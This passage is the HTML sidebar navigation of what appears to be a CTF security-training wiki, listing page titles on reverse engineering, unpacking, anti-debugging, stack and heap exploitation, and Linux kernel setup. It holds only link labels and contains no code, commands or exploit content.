class="md-nav__icon md-icon"></span> 虚拟机逆向 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/vm/vm/ class=md-nav__link> 虚拟机分析 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7 type=checkbox id=nav-8-7> <label class=md-nav__link for=nav-8-7> Platform related <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Platform related" data-md-level=2> <label class=md-nav__title for=nav-8-7> <span class="md-nav__icon md-icon"></span> Platform related </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7-1 type=checkbox id=nav-8-7-1> <label class=md-nav__link for=nav-8-7-1> Linux Reverse <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Linux Reverse" data-md-level=3> <label class=md-nav__title for=nav-8-7-1> <span class="md-nav__icon md-icon"></span> Linux Reverse </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/linux/ld_preload/ class=md-nav__link> LD_PRELOAD </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/linux/false-disasm/ class=md-nav__link> False Disassembly </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/linux/detect-bp/ class=md-nav__link> Detecting Breakpoints </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/linux/detect-dbg/ class=md-nav__link> Detecting debugging </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7-2 type=checkbox id=nav-8-7-2> <label class=md-nav__link for=nav-8-7-2> Windows Reverse <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows Reverse" data-md-level=3> <label class=md-nav__title for=nav-8-7-2> <span class="md-nav__icon md-icon"></span> Windows Reverse </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7-2-1 type=checkbox id=nav-8-7-2-1> <label class=md-nav__link for=nav-8-7-2-1> 脱壳技术 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=脱壳技术 data-md-level=4> <label class=md-nav__title for=nav-8-7-2-1> <span class="md-nav__icon md-icon"></span> 脱壳技术 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/packer-introduction/ class=md-nav__link> 保护壳简介 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/trace/ class=md-nav__link> 单步跟踪法 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/esp/ class=md-nav__link> ESP 定律法 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/direct-oep/ class=md-nav__link> 一步到达 OEP 法 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/memory/ class=md-nav__link> 内存镜像法 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/last-exception/ class=md-nav__link> 最后一次异常法 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/sfx/ class=md-nav__link> SFX 法 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/fix-iat/ class=md-nav__link> DUMP 及 IAT 重建 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/manually-fix-iat/ class=md-nav__link> 手动查找 IAT 并使用 ImportREC 重建 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/unpack/unpack-dll/ class=md-nav__link> DLL 文件脱壳 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7-2-2 type=checkbox id=nav-8-7-2-2> <label class=md-nav__link for=nav-8-7-2-2> 反调试技术 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=反调试技术 data-md-level=4> <label class=md-nav__title for=nav-8-7-2-2> <span class="md-nav__icon md-icon"></span> 反调试技术 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/ntglobalflag/ class=md-nav__link> NtGlobalFlag </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/heap-flags/ class=md-nav__link> Heap Flags </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/the-heap/ class=md-nav__link> The Heap </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/int-3/ class=md-nav__link> Interrupt 3 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/isdebuggerpresent/ class=md-nav__link> IsDebuggerPresent </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/checkremotedebuggerpresent/ class=md-nav__link> CheckRemoteDebuggerPresent </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/ntqueryinformationprocess/ class=md-nav__link> NtQueryInformationProcess </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/zwsetinformationthread/ class=md-nav__link> ZwSetInformationThread </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/junk-code/ class=md-nav__link> 花指令 </a> </li> <li class=md-nav__item> <a href=../../../../../../../reverse/platform/windows/anti-debug/example/ class=md-nav__link> 反调试技术例题 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-8 type=checkbox id=nav-8-8> <label class=md-nav__link for=nav-8-8> Language related <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Language related" data-md-level=2> <label class=md-nav__title for=nav-8-8> <span class="md-nav__icon md-icon"></span> Language related </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/language/introduction/ class=md-nav__link> 简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-8-2 type=checkbox id=nav-8-8-2> <label class=md-nav__link for=nav-8-8-2> Python <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Python data-md-level=3> <label class=md-nav__title for=nav-8-8-2> <span class="md-nav__icon md-icon"></span> Python </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/language/python/introduction/ class=md-nav__link> Python 逆向入门 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-8-3 type=checkbox id=nav-8-8-3> <label class=md-nav__link for=nav-8-8-3> Rust <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Rust data-md-level=3> <label class=md-nav__title for=nav-8-8-3> <span class="md-nav__icon md-icon"></span> Rust </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/language/rust/introduction/ class=md-nav__link> Rust 逆向入门 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-8-4 type=checkbox id=nav-8-8-4> <label class=md-nav__link for=nav-8-8-4> Golang <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Golang data-md-level=3> <label class=md-nav__title for=nav-8-8-4> <span class="md-nav__icon md-icon"></span> Golang </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../reverse/language/go/introduction/ class=md-nav__link> Golang 逆向入门 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9 type=checkbox id=nav-9 checked> <label class=md-nav__link for=nav-9> Pwn <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Pwn data-md-level=1> <label class=md-nav__title for=nav-9> <span class="md-nav__icon md-icon"></span> Pwn </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1 type=checkbox id=nav-9-1 checked> <label class=md-nav__link for=nav-9-1> Linux Platform <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Linux Platform" data-md-level=2> <label class=md-nav__title for=nav-9-1> <span class="md-nav__icon md-icon"></span> Linux Platform </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1 type=checkbox id=nav-9-1-1> <label class=md-nav__link for=nav-9-1-1> User Mode <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="User Mode" data-md-level=3> <label class=md-nav__title for=nav-9-1-1> <span class="md-nav__icon md-icon"></span> User Mode </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-1 type=checkbox id=nav-9-1-1-1> <label class=md-nav__link for=nav-9-1-1-1> Environment <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Environment data-md-level=4> <label class=md-nav__title for=nav-9-1-1-1> <span class="md-nav__icon md-icon"></span> Environment </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../user-mode/environment/ class=md-nav__link> Environment </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2 type=checkbox id=nav-9-1-1-2> <label class=md-nav__link for=nav-9-1-1-2> Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Exploitation data-md-level=4> <label class=md-nav__title for=nav-9-1-1-2> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1 type=checkbox id=nav-9-1-1-2-1> <label class=md-nav__link for=nav-9-1-1-2-1> Stack Overflow <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Stack Overflow" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-1> <span class="md-nav__icon md-icon"></span> Stack Overflow </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-1 type=checkbox id=nav-9-1-1-2-1-1> <label class=md-nav__link for=nav-9-1-1-2-1-1> x86 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=x86 data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-1-1> <span class="md-nav__icon md-icon"></span> x86 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../user-mode/stackoverflow/x86/stack-intro/ class=md-nav__link> 栈介绍 </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/stackoverflow/x86/stackoverflow-basic/ class=md-nav__link> 栈溢出原理 </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/stackoverflow/x86/basic-rop/ class=md-nav__link> 基本 ROP </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/stackoverflow/x86/medium-rop/ class=md-nav__link> 中级ROP </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-1-5 type=checkbox id=nav-9-1-1-2-1-1-5> <label class=md-nav__link for=nav-9-1-1-2-1-1-5> 高级 ROP <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="高级 ROP" data-md-level=7> <label class=md-nav__title for=nav-9-1-1-2-1-1-5> <span class="md-nav__icon md-icon"></span> 高级 ROP </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../user-mode/stackoverflow/x86/advanced-rop/advanced-rop/ class=md-nav__link> 高级 ROP </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/ class=md-nav__link> ret2dlresolve </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/stackoverflow/x86/advanced-rop/ret2vdso/ class=md-nav__link> ret2VDSO </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/stackoverflow/x86/advanced-rop/srop/ class=md-nav__link> SROP </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-1-6 type=checkbox id=nav-9-1-1-2-1-1-6> <label class=md-nav__link for=nav-9-1-1-2-1-1-6> 花式栈溢出 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=花式栈溢出 data-md-level=7> <label class=md-nav__title for=nav-9-1-1-2-1-1-6> <span class="md-nav__icon md-icon"></span> 花式栈溢出 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../user-mode/stackoverflow/x86/fancy-rop/ class=md-nav__link> 花式栈溢出技巧 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-2 type=checkbox id=nav-9-1-1-2-1-2> <label class=md-nav__link for=nav-9-1-1-2-1-2> arm <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=arm data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-1-2> <span class="md-nav__icon md-icon"></span> arm </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../user-mode/stackoverflow/arm/environment/ class=md-nav__link> 环境搭建 </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/stackoverflow/arm/rop/ class=md-nav__link> Arm ROP </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-3 type=checkbox id=nav-9-1-1-2-1-3> <label class=md-nav__link for=nav-9-1-1-2-1-3> mips <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=mips data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-1-3> <span class="md-nav__icon md-icon"></span> mips </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../user-mode/stackoverflow/mips/rop/ class=md-nav__link> mips - ROP </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-4 type=checkbox id=nav-9-1-1-2-1-4> <label class=md-nav__link for=nav-9-1-1-2-1-4> risc-v <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=risc-v data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-1-4> <span class="md-nav__icon md-icon"></span> risc-v </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../user-mode/stackoverflow/risc-v/readme/ class=md-nav__link> RISC-V </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-2 type=checkbox id=nav-9-1-1-2-2> <label class=md-nav__link for=nav-9-1-1-2-2> Format String <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Format String" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-2> <span class="md-nav__icon md-icon"></span> Format String </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../user-mode/fmtstr/fmtstr-intro/ class=md-nav__link> 原理介绍 </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/fmtstr/fmtstr-exploit/ class=md-nav__link> 利用 </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/fmtstr/fmtstr-example/ class=md-nav__link> 例子 </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/fmtstr/fmtstr-detect/ class=md-nav__link> 检测 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-3 type=checkbox id=nav-9-1-1-2-3> <label class=md-nav__link for=nav-9-1-1-2-3> Heap Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Heap Exploitation" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-3> <span class="md-nav__icon md-icon"></span> Heap Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-3-1 type=checkbox id=nav-9-1-1-2-3-1> <label class=md-nav__link for=nav-9-1-1-2-3-1> Ptmalloc2 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Ptmalloc2 data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-3-1> <span class="md-nav__icon md-icon"></span> Ptmalloc2 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/introduction/ class=md-nav__link> 堆利用 </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/heap-overview/ class=md-nav__link> 堆概述 </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/heap-structure/ class=md-nav__link> 堆相关数据结构 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-3-1-4 type=checkbox id=nav-9-1-1-2-3-1-4> <label class=md-nav__link for=nav-9-1-1-2-3-1-4> 深入理解 Ptmalloc2 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="深入理解 Ptmalloc2" data-md-level=7> <label class=md-nav__title for=nav-9-1-1-2-3-1-4> <span class="md-nav__icon md-icon"></span> 深入理解 Ptmalloc2 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/implementation/overview/ class=md-nav__link> 深入理解堆的实现 </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/implementation/basic/ class=md-nav__link> 基础操作 </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/implementation/heap-init/ class=md-nav__link> 堆初始化 </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/implementation/malloc/ class=md-nav__link> 申请内存块 </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/implementation/free/ class=md-nav__link> 释放内存块 </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/implementation/tcache/ class=md-nav__link> tcache </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/implementation/malloc-state/ class=md-nav__link> malloc_state 相关函数 </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/implementation/misc/ class=md-nav__link> 测试支持 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/heapoverflow-basic/ class=md-nav__link> 堆溢出 </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/off-by-one/ class=md-nav__link> 堆中的 Off-By-One </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/chunk-extend-overlapping/ class=md-nav__link> Chunk Extend and Overlapping </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/unlink/ class=md-nav__link> Unlink </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/use-after-free/ class=md-nav__link> Use After Free </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/fastbin-attack/ class=md-nav__link> Fastbin Attack </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/unsorted-bin-attack/ class=md-nav__link> Unsorted Bin Attack </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/large-bin-attack/ class=md-nav__link> Large Bin Attack </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/tcache-attack/ class=md-nav__link> Tcache attack </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/house-of-einherjar/ class=md-nav__link> House Of Einherjar </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/house-of-force/ class=md-nav__link> House Of Force </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/house-of-lore/ class=md-nav__link> House of Lore </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/house-of-orange/ class=md-nav__link> House of Orange </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/house-of-rabbit/ class=md-nav__link> House of Rabbit </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/house-of-roman/ class=md-nav__link> House of Roman </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/heap/ptmalloc2/house-of-pig/ class=md-nav__link> House of Pig </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-3-2 type=checkbox id=nav-9-1-1-2-3-2> <label class=md-nav__link for=nav-9-1-1-2-3-2> Musl-mallocng <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Musl-mallocng data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-3-2> <span class="md-nav__icon md-icon"></span> Musl-mallocng </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../user-mode/heap/mallocng/readme/ class=md-nav__link> Readme </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-4 type=checkbox id=nav-9-1-1-2-4> <label class=md-nav__link for=nav-9-1-1-2-4> IO_FILE Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="IO_FILE Exploitation" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-4> <span class="md-nav__icon md-icon"></span> IO_FILE Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../user-mode/io-file/introduction/ class=md-nav__link> FILE结构 </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/io-file/fake-vtable-exploit/ class=md-nav__link> 伪造vtable劫持程序流程 </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/io-file/fsop/ class=md-nav__link> FSOP </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/io-file/exploit-in-libc2.24/ class=md-nav__link> glibc 2.24下 IO_FILE 的利用 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-5 type=checkbox id=nav-9-1-1-2-5> <label class=md-nav__link for=nav-9-1-1-2-5> Integer Overflow <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Integer Overflow" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-5> <span class="md-nav__icon md-icon"></span> Integer Overflow </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../user-mode/integeroverflow/introduction/ class=md-nav__link> 整数溢出 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-6 type=checkbox id=nav-9-1-1-2-6> <label class=md-nav__link for=nav-9-1-1-2-6> Type Confusion <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Type Confusion" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-6> <span class="md-nav__icon md-icon"></span> Type Confusion </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../user-mode/type-confusion/readme/ class=md-nav__link> Type Confusion </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-7 type=checkbox id=nav-9-1-1-2-7> <label class=md-nav__link for=nav-9-1-1-2-7> Uninitialized Memory <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Uninitialized Memory" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-7> <span class="md-nav__icon md-icon"></span> Uninitialized Memory </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../user-mode/uninitialized-memory/readme/ class=md-nav__link> Uninitialized Memory </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-8 type=checkbox id=nav-9-1-1-2-8> <label class=md-nav__link for=nav-9-1-1-2-8> Race Condition <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Race Condition" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-8> <span class="md-nav__icon md-icon"></span> Race Condition </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../user-mode/race-condition/introduction/ class=md-nav__link> Race Condition </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/race-condition/problem/ class=md-nav__link> 题目 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-3 type=checkbox id=nav-9-1-1-3> <label class=md-nav__link for=nav-9-1-1-3> Defense <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Defense data-md-level=4> <label class=md-nav__title for=nav-9-1-1-3> <span class="md-nav__icon md-icon"></span> Defense </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../user-mode/mitigation/canary/ class=md-nav__link> Canary </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-4 type=checkbox id=nav-9-1-1-4> <label class=md-nav__link for=nav-9-1-1-4> Summary <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Summary data-md-level=4> <label class=md-nav__title for=nav-9-1-1-4> <span class="md-nav__icon md-icon"></span> Summary </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../user-mode/summary/get-address/ class=md-nav__link> 获取地址 </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/summary/hijack-control-flow/ class=md-nav__link> 控制程序执行流 </a> </li> <li class=md-nav__item> <a href=../../../../../user-mode/summary/get-shell/ class=md-nav__link> shell 获取小结 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2 type=checkbox id=nav-9-1-2 checked> <label class=md-nav__link for=nav-9-1-2> Kernel Mode <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Kernel Mode" data-md-level=3> <label class=md-nav__title for=nav-9-1-2> <span class="md-nav__icon md-icon"></span> Kernel Mode </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-1 type=checkbox id=nav-9-1-2-1> <label class=md-nav__link for=nav-9-1-2-1> Basic Knowledge <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Basic Knowledge" data-md-level=4> <label class=md-nav__title for=nav-9-1-2-1> <span class="md-nav__icon md-icon"></span> Basic Knowledge </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../basic-knowledge/ class=md-nav__link> Introduction to Linux kernel </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-2 type=checkbox id=nav-9-1-2-2> <label class=md-nav__link for=nav-9-1-2-2> Environment <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Environment data-md-level=4> <label class=md-nav__title for=nav-9-1-2-2> <span class="md-nav__icon md-icon"></span> Environment </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../environment/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../environment/build-kernel/ class=md-nav__link> 内核源码下载与编译 </a> </li> <li class=md-nav__item> <a href=../../../../environment/build-kernel-module/ class=md-nav__link> 编写一个 Loadable Kernel Module </a> </li> <li class=md-nav__item> <a href=../../../../environment/qemu-emulate/ class=md-nav__link> 搭建内核运行环境 </a> </li> <li class=md-nav__item> <a href=../../../../environment/real-device/ class=md-nav__link> Real Device </a> </li> <li class=md-nav__item> <a href=../../../../environment/System.map/ class=md-nav__link> System.map </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-3 type=checkbox id=nav-9-1-2-3> <label class=md-nav__link for=nav-9-1-2-3> Aim <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Aim data-md-level=4> <label class=md-nav__title for=nav-9-1-2-3> <span class="md-nav__icon 